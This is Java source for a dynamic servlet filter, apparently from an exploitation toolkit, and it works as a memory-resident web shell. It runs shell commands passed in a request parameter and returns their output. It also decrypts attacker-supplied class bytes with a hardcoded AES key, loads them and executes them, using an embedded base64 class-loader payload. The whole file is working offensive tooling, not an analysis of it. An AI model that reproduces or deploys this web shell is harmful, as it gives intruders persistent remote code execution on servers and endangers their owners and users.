package ysoserial.template;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import sun.misc.BASE64Decoder;

public class DynamicFilterTemplate implements Filter {
    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";
    private String behinderShellHeader = "X-Options-Bi";
    private String behinderShellPwd = "202cb962ac59075b";

    public DynamicFilterTemplate() {
        this.initialize();
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String k;
        Cipher cipher;
        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
            k = servletRequest.getParameter(this.basicCmdShellPwd);
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        } else if (((HttpServletRequest)servletRequest).getHeader(this.behinderShellHeader) != null) {
            try {
                System.out.println("xxxxxx1");
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                    k = this.behinderShellPwd;
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object var8 = evilClass.newInstance();
                    Method var9 = evilClass.getDeclaredMethod("equals", Object.class);
                    HashMap var10 = new HashMap(3);
                    var10.put("session", ((HttpServletRequest)servletRequest).getSession());
                    var10.put("response", (HttpServletResponse)servletResponse);
                    var10.put("request", (HttpServletRequest)servletRequest);
                    var9.invoke(var8, var10);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }

    public void destroy() {
    }

    private void initialize() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

            try {
                this.myClassLoaderClazz = classLoader.loadClass("com.feihong.ldap.template.MyClassLoader");
            } catch (ClassNotFoundException var8) {
                Class clazz = classLoader.getClass();
                Method method = null;

                while(method == null && clazz != Object.class) {
                    try {
                        method = clazz.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    } catch (NoSuchMethodException var7) {
                        clazz = clazz.getSuperclass();
                    }
                }

                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
                byte[] bytes = (new BASE64Decoder()).decodeBuffer(code);
                method.setAccessible(true);
                this.myClassLoaderClazz = (Class)method.invoke(classLoader, bytes, 0, bytes.length);
            }
        } catch (IllegalAccessException var9) {
            var9.printStackTrace();
        } catch (IOException var10) {
            var10.printStackTrace();
        } catch (InvocationTargetException var11) {
            var11.printStackTrace();
        }

    }
}
